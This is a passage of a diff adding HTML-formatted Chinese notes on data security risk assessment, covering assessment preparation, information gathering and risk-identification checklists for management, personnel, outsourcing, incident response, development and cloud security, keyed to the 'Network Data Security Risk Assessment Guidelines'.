+&lt;li&gt;文档核查：查验安全管理制度、风险评估报告、等保测评报告等有关材料及制度落实情况的证明材料&lt;/li&gt;
+&lt;li&gt;安全核查：检查网络环境、数据库和大数据平台等相关系统和设备安全策略、配置、防护措施等&lt;/li&gt;
+&lt;li&gt;技术测试：应用技术工具、渗透测试等手段查看数据资产情况、检查防护措施有效性&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;03 评估准备与信息调研&lt;/h1&gt;
+&lt;h2&gt;1. 评估准备-明确评估目标&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;摸清数据种类、规模、分布等情况&lt;/li&gt;
+&lt;li&gt;摸清数据处理活动情况&lt;/li&gt;
+&lt;li&gt;发现可能影响国家安全、公共利益或者个人、组织合法权益的数据安全问题和风险&lt;/li&gt;
+&lt;li&gt;发现共享、交易、委托处理、向境外提供重要数据等处理活动的数据安全问题和风险&lt;/li&gt;
+&lt;li&gt;促进完善数据安全保护措施，提示数据安全保护能力&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【评估准备】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;2. 评估准备-确定评估范围&lt;/h2&gt;
+&lt;p&gt;确定组织全部的数据和数据处理活动的评估范围
+根据工作需要和评估目标，确定数据安全风险评估的对象、范围和边界，明确评估涉及的数据资产、数据处理活动、业务和信息系统、人员和内外部组织等&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;组织全部的数据和数据处理活动
+&lt;ol&gt;
+&lt;li&gt;全面摸排：被评估方数据安全整体情况，摸清其数据资产、数据处理活动、数据分类分级等情况&lt;/li&gt;
+&lt;li&gt;重点评估：结合数据分类分级选择重点评估对象，将涉及个人信息、重要数据、核心数据的所有数据处理活动，以及抽样选择的其他典型一般数据的处理活动作为重点评估对象开展评估；未开展分类分级工作，结合业务、信息系统的重要性和敏感性，选择核心业务或重要信息系统和数据处理活动作为重点评估对象开展评估&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【评估准备】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;3. 评估准备-组建评估团队&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;组建自评估团队
+&lt;ol&gt;
+&lt;li&gt;组织业务、安全、法务、合规、运维、研发等相关部门参与，评估组长为数据安全负责人或授权代表担任，委托第三方专业机构评估&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;组建检查评估团队
+&lt;ol&gt;
+&lt;li&gt;根据评估范围、涉及的行业特征、专业需求，选择具备相关专业能力的评估人员&lt;/li&gt;
+&lt;li&gt;提前完成风险评估文档、检测工具等各项准备工作，并签署保密协议&lt;/li&gt;
+&lt;li&gt;被评估方建立专项工作团队，包括数据安全负责人和安全、法务、合规、运维、、研发、业务、数据、风险等相关人员&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【评估准备】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;4. 评估准备-开展前期准备&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;制定工作计划
+&lt;ol&gt;
+&lt;li&gt;工作目的&lt;/li&gt;
+&lt;li&gt;工作要求&lt;/li&gt;
+&lt;li&gt;工作内容&lt;/li&gt;
+&lt;li&gt;工作流程&lt;/li&gt;
+&lt;li&gt;调研安排&lt;/li&gt;
+&lt;li&gt;评估总体进度安排&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;确定评估依据
+&lt;ol&gt;
+&lt;li&gt;法律：《网络安全法》《数据安全法》《个人信息保护法》等&lt;/li&gt;
+&lt;li&gt;部门规章：网信部门及监管部门相关数据安全规章、规范性文件&lt;/li&gt;
+&lt;li&gt;地方政策&lt;/li&gt;
+&lt;li&gt;相关标准&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;确定评估内容
+&lt;ol&gt;
+&lt;li&gt;结合评估目标、范围、依据，针对被评估方的实际情况，确定被评估方每个评估对象适用的评估内容&lt;/li&gt;
+&lt;li&gt;数据处理者应针对数据处理活动、数据安全管理、数据安全技术等方面进行风险评估&lt;/li&gt;
+&lt;li&gt;涉及处理个人信息应在上面的基础上，对个人信息保护开展风险评估，评估过程中，根据任务要求、评估重点、监管需要、评估依据等完善评估内容&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;建立评估文档
+&lt;ol&gt;
+&lt;li&gt;针对评估目标、范围、依据和内容，准备风险评估调研表、技术测试工具等&lt;/li&gt;
+&lt;li&gt;评估过程中，对相关文件统一编号，并规范管理&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【评估准备】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;5. 评估准备-制定评估方案&lt;/h2&gt;
+&lt;p&gt;评估团队编制评估工作方案，包括但不限于&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;评估概述：包括评估目标、评估依据等内容&lt;/li&gt;
+&lt;li&gt;评估范围：包括评估对象选择方法、评估对象描述、评估范围等&lt;/li&gt;
+&lt;li&gt;评估内容和方法：包括评估内容、评估准则、评估方法等内容&lt;/li&gt;
+&lt;li&gt;评估人员：包括评估队伍的组织结构、负责人、成员、职责分工等内容&lt;/li&gt;
+&lt;li&gt;实施计划：包括时间进度安排、人员安排等内容&lt;/li&gt;
+&lt;li&gt;工作要求：包括评估工作要求，被评估方保障等&lt;/li&gt;
+&lt;li&gt;测试方案：开展技术测试前应明确方案，包括采用的工具、测试内容、测试环境、应急措施等&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【评估准备】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;6. 信息调研-数据处理者调研&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;基本信息：单位名称、组织机构代码、办公地址、法定代表人信息、人员规模、经营范围、数据安全负责人及其职务、联系方式等基本信息&lt;/li&gt;
+&lt;li&gt;单位性质：例如党政机关、事业单位、企业、社会团体等&lt;/li&gt;
+&lt;li&gt;是否属于特定类型数据处理者：例如政务数据处理者、大型网络平台运营者、关键信息基础设施运营者等&lt;/li&gt;
+&lt;li&gt;所属行业领域&lt;/li&gt;
+&lt;li&gt;业务运营地区：开展数据处理活动所在国家和地区等&lt;/li&gt;
+&lt;li&gt;主要业务范围、业务规模等&lt;/li&gt;
+&lt;li&gt;许可证获取：数据处理相关服务取得行政许可的情况&lt;/li&gt;
+&lt;li&gt;资本/实际控制人：被评估单位的资本组成和实际控制人情况&lt;/li&gt;
+&lt;li&gt;境外资本参与：是否境外上市或计划赴境外上市及境外资本参与情况，或以协议控制（VIE）架构等方式实质性境外上市&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【信息调研】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;7. 信息调研-业务和信息系统调研&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;网络和信息系统基本情况：包括网络规模、拓扑结构、信息系统等情况和对外连接、运营维护等情况以及是否为关键信息基础设施等情况&lt;/li&gt;
+&lt;li&gt;业务基本信息：包括业务描述、业务类型、服务对象、业务流程、用户规模、覆盖地域、相关部门等基本信息&lt;/li&gt;
+&lt;li&gt;业务涉及个人信息：重要数据和核心数据处理情况&lt;/li&gt;
+&lt;li&gt;业务为政务部门或境外用户提供服务情况&lt;/li&gt;
+&lt;li&gt;信息系统、APP和小程序情况：包括系统功能、网络安全等级保护备案和测评结论、入口地址、系统连接关系、数据库接口、APP及小程序名称和版本等&lt;/li&gt;
+&lt;li&gt;数据中心和使用云平台情况&lt;/li&gt;
+&lt;li&gt;接入的外部第三方产品、服务或SDK情况：包括名称、版本、提供方、使用目的、合同协议等&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【信息调研】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;8. 信息调研-数据资产调研&lt;/h2&gt;
+&lt;p&gt;梳理结构化数据（如数据库表等）和非结构化数据（如图表文件），摸清数据底数，输出数据资产清单&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;数据资产情况：包括数据资产类型、数据范围、数据规模、数据形态、数据存储分布、元数据等&lt;/li&gt;
+&lt;li&gt;数据分类分级情况：包括数据分类分级规则、数据类别、数据级别、重要数据和核心数据目录情况等&lt;/li&gt;
+&lt;li&gt;个人信息情况：包括个人信息种类、规模、敏感程度、数据来源、业务流转及与信息系统的对应关系等&lt;/li&gt;
+&lt;li&gt;重要数据：包括重要数据种类、规模、行业领域、敏感程度、数据来源、业务流转及与信息系统的对应关系等&lt;/li&gt;
+&lt;li&gt;核心数据：包括核心数据种类、规模、行业领域、敏感程度、数据来源、业务流转及与信息系统的对应关系等&lt;/li&gt;
+&lt;li&gt;其他一般数据情况&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【信息调研】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;9. 信息调研-数据处理活动调研&lt;/h2&gt;
+&lt;p&gt;针对评估对象和范围，梳理数据处理活动清单，验证或绘制数据流转图&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;数据收集情况：如数据收集渠道、收集方式、数据范围、收集目的、收集频率、外部数据源、合同协议、相关系统，以及在被评估方外部公共场所安装图像采集、个人身份识别设备的情况等&lt;/li&gt;
+&lt;li&gt;数据存储情况：如数据存储方式、数据中心、存储系统（如数据库、大数据平台、云存储、网盘、存储介质等）、外部存储机构、存储地点、存储期限、备份冗余策略等&lt;/li&gt;
+&lt;li&gt;数据传输情况：如数据传输途径和方式（如互联网、VPN、物理专线等在线通道情况、采用介质或离线传输情况）、传输协议、内部数据共享、数据接口等&lt;/li&gt;
+&lt;li&gt;数据使用和加工情况：如数据使用目的、方式、范围、场景、算法规则、相关系统和部门，数据清洗、转换、标注等加工情况，应用算法推荐技术提供互联网信息服务的情况，核心数据、重要数据或个人信息委托处理、共同处理的情况等&lt;/li&gt;
+&lt;li&gt;数据提供情况：如数据提供（数据共享、数据交易，因合并、分立、解散、被宣告破产等原因需要转移数据等）的目的、方式、范围、数据接收方、合同协议、对外提供的个人信息和重要数据的种类、数量、范围、敏感程度、保存期限等&lt;/li&gt;
+&lt;li&gt;数据公开情况：如数据公开的目的、方式、对象范围、受众数量、行业、组织、地域等&lt;/li&gt;
+&lt;li&gt;数据删除情况：如数据删除情形、删除方式、数据归档、介质销毁等&lt;/li&gt;
+&lt;li&gt;数据出境情况：是否存在个人信息或重要数据出境，如跨境业务，跨境办公，跨境上市，使用境外云服务器或数据中心，国际交流合作等场景的数据出境情况&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【信息调研】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;10. 信息调研-安全措施调研&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;已有评估：已开展的等级保护测评、商用密码应用安全性评估、安全检测、风险评估、安全认证、合规审计情况，及发现问题的整改情况&lt;/li&gt;
+&lt;li&gt;组织人员：数据安全管理组织、人员及制度情况&lt;/li&gt;
+&lt;li&gt;安全设备：防火墙、入侵检测、入侵防御等网络安全设备及策略情况&lt;/li&gt;
+&lt;li&gt;身份鉴别：身份鉴别与访问控制情况&lt;/li&gt;
+&lt;li&gt;漏洞管理修复：网络安全漏洞管理及修复情况&lt;/li&gt;
+&lt;li&gt;远程管理：VPN等远程管理软件的用户及管理情况&lt;/li&gt;
+&lt;li&gt;口令管理：设备、系统及用户的帐号口令管理情况&lt;/li&gt;
+&lt;li&gt;安全技术：加密、脱敏、去标识化等安全技术应用情况&lt;/li&gt;
+&lt;li&gt;安全事件：3年内发生的网络和数据安全事件、攻击威胁情况。如事件名称、数据类型和数量、发生原因、级别、处置措施、整改措施，重大事件需要提供事件调查报告；&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【信息调研】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;04 风险识别与风险控制&lt;/h1&gt;
+&lt;h2&gt;1. 风险识别-安全管理制度&lt;/h2&gt;
+&lt;p&gt;针对数据安全制度体系建设情况重点评估：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;总体制定情况：数据安全总体策略、方针、目标和原则制定情况&lt;/li&gt;
+&lt;li&gt;工作规划方案：数据安全管理工作规划或工作方案制定情况&lt;/li&gt;
+&lt;li&gt;体系重点内容：数据分类分级、数据安全评估、数据访问权限管理、数据全生命周期管理、数据安全应急响应、数据合作方管理、数据脱敏、数据加密、数据安全审计、数据资产管理、大数据平台安全制度建设情况&lt;/li&gt;
+&lt;li&gt;关键岗位规程：关键岗位数据安全管理操作规程建设情况&lt;/li&gt;
+&lt;li&gt;合规监管：制度内容与国家和行业数据安全法律法规和监管要求的符合情况
+针对被评估方数据安全制度落实情况重点评估：&lt;/li&gt;
+&lt;li&gt;责任制：网络安全责任制、数据安全责任制落实情况，网络安全和数据安全事件责任查处情况&lt;/li&gt;
+&lt;li&gt;制度建设：数据安全制度的制定、评审、发布流程建设情况&lt;/li&gt;
+&lt;li&gt;审核更新：数据安全制度定期审核和更新情况&lt;/li&gt;
+&lt;li&gt;制度发布：制度发布范围是否覆盖全面，发布方式是否正规、有效&lt;/li&gt;
+&lt;li&gt;制度落实：数据安全制度落实情况，是否具备操作规程、记录表单等制度落实证明材料&lt;/li&gt;
+&lt;li&gt;监督检查机制：制度落实监督检查机制&lt;/li&gt;
+&lt;li&gt;重要数据处理者风险评估：对数据处理活动定期开展数据安全风险评估的情况&lt;/li&gt;
+&lt;li&gt;重要数据处理者评估报告：向有关部门报送评估报告情况，风险评估报告至少包含处理的数据数据的种类、数量、开展数据处理活动的情况，面临的数据安全风险及其对应措施等&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【风险识别】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;2. 风险识别-安全组织机构&lt;/h2&gt;
+&lt;p&gt;针对被评估方数据安全组织架构建设情况重点评估：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;机构职能：数据安全管理机构和职能设置情况&lt;/li&gt;
+&lt;li&gt;负责人职能：数据安全负责人和职能设置情况&lt;/li&gt;
+&lt;li&gt;高层人员决策：单位高层人员参与数据安全决策情况&lt;/li&gt;
+&lt;li&gt;内部安全监督：对组织内的数据安全管理执行情况、数据操作行为等进行安全监督的情况&lt;/li&gt;
+&lt;li&gt;需求适应性：数据安全人员和资源投入情况与组织数据安全保护需求适应性
+针对被评估方数据安全岗位设置情况重点评估：&lt;/li&gt;
+&lt;li&gt;关键岗位设置和原则落实：数据库管理员、操作员及安全审计人员、安全运维人员、数据备份管理人员、数据恢复管理人员等数据安全关键岗位设置情况，及职责分离、专人专岗等原则落实情况&lt;/li&gt;
+&lt;li&gt;相关部门人员设置和管理执行：业务部门、信息系统建设部门、信息系统运维部门数据安全人员设置情况，数据安全管理要求执行情况&lt;/li&gt;
+&lt;li&gt;关键岗位双人双岗情况：特权账户所有者、关键数据处理岗位等数据安全关键岗位设立双人双岗情况&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【风险识别】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;3. 风险识别-分类分级管理&lt;/h2&gt;
+&lt;p&gt;针对数据资产管理情况重点评估：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;数据资产台帐：数据资产台帐建设、更新、维护情况&lt;/li&gt;
+&lt;li&gt;数据资产梳理全面性：数据资产梳理是否全面，是否能够覆盖数据库、大数据存储组件、云上对象存储或网盘等存储工具及办公计算机、U盘、光盘等存储介质中的数据&lt;/li&gt;
+&lt;li&gt;数据资产清单：通过数据资产管理等工具对数据资产清单及时更新、维护的情况&lt;/li&gt;
+&lt;li&gt;技术扫描识别：采用技术手段定期对数据资产进行扫描的情况，及及时发现识别个人信息、重要数据的能力
+针对数据分类分级制度建设情况重点评估&lt;/li&gt;
+&lt;li&gt;分类分级保护制度：数据分类分级保护制度建设情况，是否符合国家、行业和地方的数据分类分级规范要求&lt;/li&gt;
+&lt;li&gt;分类分级管理和目录建设：数据分类分级管理情况，及核心数据和重要数据目录建立及维护情况&lt;/li&gt;
+&lt;li&gt;制度明确和措施落实：是否在相关制度中明确了数据分类管理、分级保护策略，数据分类分级保护措施是否落实在数据访问权限申请、保护措施部署等方面&lt;/li&gt;
+&lt;li&gt;变更和审核：数据分类分级变更和审核流程情况&lt;/li&gt;
+&lt;li&gt;个人信息分类分级：个人信息分类分级管理情况
+针对数据分类分级保护情况重点评估：&lt;/li&gt;
+&lt;li&gt;明确标识：是否对处理的个人信息和重要数据进行明确标识&lt;/li&gt;
+&lt;li&gt;数据级别覆盖：按照数据级别建设覆盖全流程数据处理活动的安全措施情况&lt;/li&gt;
+&lt;li&gt;工具建设：数据分类分级标识或资产管理工具建设情况，是否具有自动化标识能力，是否具有数据标识结果发布、审核等能力&lt;/li&gt;
+&lt;li&gt;重要数据评估：按照相关重要数据目录或规定，评估重要数据并进行重点保护的情况&lt;/li&gt;
+&lt;li&gt;核心数据评估：按照相关核心数据目录或规定，评估核心数据并进行重点保护的情况&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【风险识别】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;4. 风险识别-人员安全管理&lt;/h2&gt;
+&lt;p&gt;针对人员录用情况重点评估：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;背景调查：重要岗位人员录用前背景调查情况&lt;/li&gt;
+&lt;li&gt;录用考核：数据处理关键岗位人员录用，对其数据安全意识或专业能力进行考核的情况
+针对保密协议签订情况重点评估：&lt;/li&gt;
+&lt;li&gt;明确禁止行为：员工工作纪律和工作要求中是否明确规定员工禁止的数据安全相关行为&lt;/li&gt;
+&lt;li&gt;签订人员覆盖面：是否与所有涉及数据服务的人员签订安全责任承诺书或保密协议，与数据安全关键岗位人员签订数据安全岗位责任协议&lt;/li&gt;
+&lt;li&gt;明确调离或终止劳动合同保密义务：在重要岗位人员调离或终止劳动合同前，是否明确并告知其继续履行有关信息的保密义务要求，并签订保密承诺书
+针对人员转岗离岗管理情况重点评估：&lt;/li&gt;
+&lt;li&gt;转岗离岗权限终止或变更：在人员转岗或离岗时，是否及时终止或变更完成相关人员数据操作权限，并明确有关人员后续的数据管理权限和保密责任&lt;/li&gt;
+&lt;li&gt;离岗权限收回并告知保密义务：对终止劳动合同的人员，是否及时终止并收回其系统权限及数据权限，明确告知其继续履行有关信息的保密义务要求
+针对人员数据安全培训情况重点评估：&lt;/li&gt;
+&lt;li&gt;培训制定更新：数据安全配置制定、更新情况&lt;/li&gt;
+&lt;li&gt;安全意识教育培训：开展数据安全意识教育培训，并保留相关记录情况&lt;/li&gt;
+&lt;li&gt;数据安全专项培训：是否对数据安全岗位人员每年至少开展1次数据安全专项培训，对关键岗位人员进行定期数据安全技能考核情况&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【风险识别】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;5. 风险识别-合作外包管理&lt;/h2&gt;
+&lt;p&gt;针对合作方管理机制建设情况重点评估：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;合作方管理机制：数据合作方安全管理机制建设情况，如对合作方或外包服务机构的选择、评价、管理、监督机制&lt;/li&gt;
+&lt;li&gt;合作方安全能力评估：是否对数据合作方或外包服务机构的安全能力进行评估&lt;/li&gt;
+&lt;li&gt;外包安全监督检查：对外包服务机构、人员履行安全责任义务的监督检查情况&lt;/li&gt;
+&lt;li&gt;外包现场服务安全：外包人员现场服务安全管理情况&lt;/li&gt;
+&lt;li&gt;外包技术依赖：对外包服务商的技术依赖程度，对委托处理数据的控制和管理能力
+针对合作协议约束情况重点评估：&lt;/li&gt;
+&lt;li&gt;数据使用行为约束：服务合同、承诺及安全保密协议情况，是否通过合同协议等方式对接收、使用本单位数据的合作方的数据使用行为进行约束&lt;/li&gt;
+&lt;li&gt;合作协议重点内容明确：是否在合作协议中明确了数据处理目的、方式、范围、安全保护责任、数据返还或销毁要求、保密约定及违约责任和处罚条款等&lt;/li&gt;
+&lt;li&gt;数据安全责任界定：合同、协议中，数据处理者与合作方、外包服务商间的数据安全责任界定情况
+针对外包人员访问权限管理情况重点评估：&lt;/li&gt;
+&lt;li&gt;最小必要范围：对数据与系统访问、修改权限是否限于最小必要范围&lt;/li&gt;
+&lt;li&gt;环境权限和数据开放程度：能够在测试环境下或使用测试数据完成的，是否向外包人员开放了生产环境权限或真实数据&lt;/li&gt;
+&lt;li&gt;数据导出或外发监督管理：外包人员数据导出操作或数据外发操作的管理监督情况&lt;/li&gt;
+&lt;li&gt;敏感数据检测：外包人员对敏感数据的访问及操作能否被实时监督或监测&lt;/li&gt;
+&lt;li&gt;帐号及访问权限管理：数据外包服务帐号及访问权限管理情况&lt;/li&gt;
+&lt;li&gt;远程访问操作：外包人员远程访问操作系统或数据的情况
+针对第三方接入与数据回收的情况重点评估：&lt;/li&gt;
+&lt;li&gt;技术检测或评估报告：是否对合作方接入的系统、使用的技术工具进行了技术检测，或合作方提供专业第三方机构评估的数据安全报告，避免木马、后门等&lt;/li&gt;
+&lt;li&gt;合作结束数据回收和删除：合作结束后是否进行了数据回收，是否要求合作方对数据进行删除&lt;/li&gt;
+&lt;li&gt;外包到期帐号数据管理：服务到期后，帐号注销、数据回收、数据删除销毁等管理情况&lt;/li&gt;
+&lt;li&gt;合作结束系统权限接口管理：为完成技术或服务目的向合作方提供的系统权限和接口，在合作结束后是否进行了停用或下线
+涉及政务部门或针对法律、法规授权的具有管理公共事务职能的组织委托处理政务数据的情况重点评估：&lt;/li&gt;
+&lt;li&gt;审批程序和合同监督：委托他人建设、维护电子政务系统，存储、加工政务数据，是否经过严格的批准程序，是否以合同等手段监督受托方履行相应的数据安全保护义务&lt;/li&gt;
+&lt;li&gt;数据安全保护义务履行：政务数据受托方依照法律、法规的规定和合同约定履行数据安全保护义务的情况，是否擅自留存、使用、泄露或者向他人提供政务数据&lt;/li&gt;
+&lt;li&gt;安全措施符合要求：支撑电子政务相关系统运行的相关服务或系统的安全措施，是否满足电子政务系统管理和相关安全要求&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【风险识别】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;6. 风险识别-安全威胁和应急管理&lt;/h2&gt;
+&lt;p&gt;识别安全威胁和安全事件情况重点评估：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;安全事件信息及处理情况：近3年发生的网络安全或数据安全事件信息及其处置、记录、整改和上报情况，如事件名称、影晌对象、发生时问和频次、发生原因、外部威胁、事件级别、处置措施、整改措施等，重大事件需提供事件调查评估报告&lt;/li&gt;
+&lt;li&gt;安全威胁、违规行为统计：近1年通过安全工具、日志申计、安全测评、合规自查等发现的安全威胁、违规行为及其频率统计&lt;/li&gt;
+&lt;li&gt;攻击威胁情况：实际环境中通过监测系统、检测工具等发现的攻击威胁情况&lt;/li&gt;
+&lt;li&gt;威胁事件公布或曝光：近期公布或曝光的同行业、类似业务模式的威胁事件、威胁预警
+针对数据安全应急管理情况重点评估：&lt;/li&gt;
+&lt;li&gt;应急预案制定和修订：数据安全事件应急预案制定和修订情况，是否定义数据安全事件类型，明确不同类别级别事件的处置流程和方法&lt;/li&gt;
+&lt;li&gt;应急响应及处置机制：数据安全应急响应及处置机制建设情况，发生数据安全事件时是否立即采取处置措施，是否按照规定及时告知用户并向有关主管部门报告&lt;/li&gt;
+&lt;li&gt;应急演练：数据安全事件应急演练情况&lt;/li&gt;
+&lt;li&gt;安全风险监测：数据处理活动安全风险监测情况，发现数据安全缺陷、漏洞等风险时，是否立即采取补救措施&lt;/li&gt;
+&lt;li&gt;安全事件危害告知：安全事件对个人、其他组织造成危害的，是否将安全事件和风险情况、危害后果、已经采取的补救措施等通知利害关系人，无法通知的是否采取公告等其他方式告知&lt;/li&gt;
+&lt;li&gt;投诉举报渠道：面向社会提供服务的数据处理者是否建立便捷的数据安全相关投诉举报渠道，以及近3年的数据安全投诉举报处置、记录和整改情况，是否存在侵害用户个人信息合法权益的情况&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【风险识别】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;7. 风险识别-开发运维管理&lt;/h2&gt;
+&lt;p&gt;针对开发运维管理情况重点评估：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;新应用开发申核流程：新应用开发审核流程建 设情况，进行数据处理需求安全合规申核情况&lt;/li&gt;
+&lt;li&gt;开发程序流程：开发程序的修改、更新、发布的批准授权和版本控制流程&lt;/li&gt;
+&lt;li&gt;工程安全管理：工程实施、验收、交付的安全管理情况&lt;/li&gt;
+&lt;li&gt;代码和测试数据安全管理：对开发代码、测试数据的安全管理情况&lt;/li&gt;
+&lt;li&gt;上线安全评估：产品或业务上线前进行安全评估的情况&lt;/li&gt;
+&lt;li&gt;开发环境和实际环境控制：开发测试环境和实际运行环境的隔离情况、测试数据和测试结果的控制情况&lt;/li&gt;
+&lt;li&gt;开发测试数据去标识化：开发测试中使用真实个人信息、核心数据、重要数据情况，开发测试前对相关数据进行去标识化、脱敏处理（测试确需信息除外）情况&lt;/li&gt;
+&lt;li&gt;人员监督申计：对开发和运维人员行为的监督和审计情况&lt;/li&gt;
+&lt;li&gt;远程运维安全防护：远程运维的申批、管理和安全防护措施&lt;/li&gt;
+&lt;li&gt;开源技术资料完备性：第三方SDK或开源软件的远行维护、二次开发等技术资料完备性&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》【风险识别】&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;8. 风险识别-云数据安全&lt;/h2&gt;
+&lt;p&gt;针对被评估对象使用云计算服务时重点评估：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;安全责任划分：云服务提供者、第三方厂商、云租户的安全责任划分和落实情况&lt;/li&gt;
+&lt;li&gt;上云数据安全：上云数据的安全审核和管理情况&lt;/li&gt;
+&lt;li&gt;云安全产品服务：云安全产品服务的使用和配置情况&lt;/li&gt;
+&lt;li&gt;云上操作安全申计：对云上操作行为的安全审计情况&lt;/li&gt;
+&lt;li&gt;云用户账号和权限：云用户账号和权限管理情况&lt;/li&gt;
+&lt;li&gt;私有云远程运维安全：私有云远程运维安全管理情况&lt;/li&gt;
+&lt;li&gt;云上用户个人信息安全：云上承载用户个人信息、重要数据、核心数据情况，是否对重要数据、敏感个人信息实施增强的安全防护
+针对被评估对象是云计算服务提供者时重点评估：&lt;/li&gt;
+&lt;li&gt;云平台间边界防护：公有云、社区云等不同类型云平台间边界防护情況&lt;/li&gt;
+&lt;li&gt;数据传输安全：租户与云平台、数据中心间数据传输安全防护情况&lt;/li&gt;
+&lt;li&gt;安全责任界面划定：针对不同服务模式、部署模式、产品和服务，云平台对相关方的数据安全责任界面划定情况及合法合规性&lt;/li&gt;
+&lt;li&gt;与租户划清责任边界：是否通过合同协议等方式，与租户划清云数据安全责任边界，并履行相应数据安全责任&lt;/li&gt;
+&lt;li&gt;提供保障措施：发生数据安全风险或事件时，为租户提供事件报告、应急处置等协同保障措施情况&lt;/li&gt;
+&lt;li&gt;租户数据收集：收集租户数据情况，是否识别重要数据、个人信息，收集方式是否安全合理，是否存在超范围收集&lt;/li&gt;
+&lt;li&gt;产品安全配置：计算、存储、网络、数据库、安全等产品安全配置情况&lt;/li&gt;
+&lt;li&gt;第三方组件：第三方组件安全核查、漏洞修复情况&lt;/li&gt;
+&lt;li&gt;云产品漏洞更新推送：云产品漏洞更新和推送情况，是否会及时提供补丁推送、跟进用户漏洞更新等情况&lt;/li&gt;
+&lt;li&gt;云平台基础安全防护：云平台提供的基础安全防护能力情况&lt;/li&gt;
+&lt;li&gt;高风险操作提示：云产品对用户高风险操作的提示情况&lt;/li&gt;
+&lt;li&gt;身份管理和访问控制：对云租户的身份管理和访问控制情況&lt;/li&gt;
+&lt;li&gt;数据安全制度措施：云平台保障租户数据安全的相关制度和安全措施&lt;/li&gt;
+&lt;li&gt;云数据删除：约定服务到期、欠费、提前终止等情形下，云数据删除和个人信息权益保障等情况&lt;/li&gt;
